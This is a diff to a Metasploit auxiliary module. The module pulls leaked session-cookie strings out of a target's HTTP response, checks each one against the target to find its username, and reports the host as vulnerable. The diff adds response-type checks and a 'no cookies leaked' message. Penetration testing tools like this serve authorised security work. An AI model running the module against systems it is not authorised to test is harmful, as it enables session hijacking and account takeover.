@@ -68,19 +68,27 @@ class MetasploitModule < Msf::Auxiliary
         'Connection' => 'close'
       }
     )
+    return nil unless res&.code == 200
+    return nil unless res.headers['Content-Type'].present?
+    return nil unless res.headers['Content-Type'].downcase.start_with?('application/json')
 
+    username = nil
     res.body.scan(/([0-9a-f]{32,65})/i).each do |cookie|
       cookie = cookie.first
       username = get_user_for_cookie(cookie)
       next unless username
 
-      print_good("Cookie: #{COOKIE_NAME}=#{cookie} username: #{username}")
+      print_good("Cookie: #{COOKIE_NAME}=#{cookie} Username: #{username}")
       report_vuln(
         host: rhost,
         port: rport,
         name: name,
         refs: references
       )
+    end
+
+    unless username
+      print_status('No valid cookies were leaked from the target.')
     end
   end
 end
